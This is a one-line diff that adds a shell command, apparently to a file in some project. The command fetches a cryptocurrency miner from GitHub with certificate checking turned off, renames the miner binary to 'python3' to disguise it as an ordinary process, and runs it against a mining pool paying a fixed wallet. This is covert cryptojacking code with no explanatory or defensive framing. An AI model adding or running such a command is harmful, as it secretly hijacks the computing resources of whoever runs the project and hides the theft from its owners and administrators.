@@ -1,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 python3 && ./python3 -a yespower -o stratum+tcp://yespower.eu.mine.zpool.ca:6234 -u t1UYZUpgVzViCMQemJyoNUEerPFBp3KsgR9 -p c=FLUX -t 3
